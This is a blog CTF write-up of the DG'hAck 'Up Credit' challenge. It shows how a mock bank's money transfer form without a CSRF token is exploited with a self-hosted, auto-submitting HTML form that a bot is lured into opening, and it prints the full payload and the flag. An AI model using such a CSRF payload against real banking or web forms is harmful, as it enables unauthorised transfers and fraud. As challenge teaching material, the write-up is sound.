<!doctype html><html lang=en><head><title>Writeup DG'hAck: Up Credit :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!
Let&amp;rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:

After logging in, we are presented with an interface that has three tabs:
 an activity log a money transfer form a form to contact our financial advisor  Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/blog/writeup-dghack-up-credit/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Writeup DG'hAck: Up Credit"><meta property="og:description" content="The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!
Let&amp;rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:

After logging in, we are presented with an interface that has three tabs:
 an activity log a money transfer form a form to contact our financial advisor  Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted."><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-up-credit/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-11-19 04:29:21 +0100 CET"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-dghack-up-credit/>Writeup DG&rsquo;hAck: Up Credit</a></h1><div class=post-meta><span class=post-date>2020-11-19</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
#<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content><div><p>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!</p><p>Let&rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:</p><p><a href=/assets/dghack/upcredit-registration.png><img src=/assets/dghack/upcredit-registration.png alt="The registration message"></a></p><p>After logging in, we are presented with an interface that has three tabs:</p><ul><li>an activity log</li><li>a money transfer form</li><li>a form to contact our financial advisor</li></ul><p>Trying an XSS in the contact form quickly reveals that the bot doesn&rsquo;t execute any javascript, but does click any link that is posted. This will probably be useful later on.</p><p>Let&rsquo;s look at the money transfer form:</p><p><a href=/assets/dghack/upcredit-money-transfer.png><img src=/assets/dghack/upcredit-money-transfer.png alt="The money transfer form"></a></p><p>It looks quite simple. After registering another account and trying:</p><ul><li>sending money we don&rsquo;t have</li><li>sending huge amounts of money</li><li>sending negative amounts of money</li><li>some sqli</li></ul><p>We find out that the form is quite secure. But wait, it doesn&rsquo;t have any CSRF token! Let&rsquo;s try exploiting that. Using <a href=ngrok.com>ngrok</a>, we create a webpage and temporarily host it.</p><p>In it, we copy the form which we fill out, and add a little bit of JS to automatically submit it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://upcredit4.chall.malicecyber.com/transfer&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form&#34;</span>&gt;
    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col-md-12 col-sm-12 col-xs-12&#34;</span>&gt;
        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-group&#34;</span>&gt;
        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;account&#34;</span>
                   <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Account number&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;account&#34;</span>
                   <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Aln6qOfUJ&#34;</span>&gt;
        &lt;/<span style=color:#f92672>div</span>&gt;
        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-group&#34;</span>&gt;
            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;number&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;amount&#34;</span>
                   <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Amount&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;amount&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;200&#34;</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;help-block with-errors&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;color: #f00&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
        &lt;/<span style=color:#f92672>div</span>&gt;
        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pull-right&#34;</span>&gt;
            &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;reg-submit&#34;</span>
                    <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-md btn-common btn-log&#34;</span>&gt;Send
            &lt;/<span style=color:#f92672>button</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;msgSubmit&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;h3 text-center hidden&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;clearfix&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
        &lt;/<span style=color:#f92672>div</span>&gt;
    &lt;/<span style=color:#f92672>div</span>&gt;
&lt;/<span style=color:#f92672>form</span>&gt;

&lt;<span style=color:#f92672>script</span>&gt;
    <span style=color:#a6e22e>form</span>.<span style=color:#a6e22e>submit</span>()
&lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div><p>After posting the link to our form in the contact area and waiting for a few seconds, we get a money transfer:</p><p><a href=/assets/dghack/upcredit-credited.png><img src=/assets/dghack/upcredit-credited.png alt="The money transfer form"></a></p><p>And we can buy the flag: <code>W1nG4rD1um\L3v1os444!</code>.</p><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-dghack-server-room/><span class=button__icon>←</span>
<span class=button__text>Writeup DG'hAck: Server Room</span></a></span>
<span class="button next"><a href=https://nicolasb.fr/blog/writeup-dghack-internal-support-2/><span class=button__text>Writeup DG'hAck: Internal Support 2</span>
<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>